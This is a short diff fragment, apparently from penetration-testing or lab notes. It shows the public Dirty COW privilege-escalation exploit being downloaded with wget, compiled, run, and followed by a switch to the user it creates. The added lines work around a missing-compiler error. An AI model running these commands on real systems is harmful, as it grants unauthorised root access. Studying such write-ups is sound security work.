@@ -825,6 +825,9 @@ wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
 uname -a
 Linux humble 3.2.0-4-486 #1 Debian 3.2.78-1 i686 GNU/Linux
 gcc -pthread dirty.c -o dirty -lcrypt
+gcc: error trying to exec 'cc1': execvp: No such file or directory
+locate cc1
+export PATH=$PATH:/usr/lib/gcc/i486-linux-gnu/4.7/cc1
 ./dirty
 su firefart
 ````
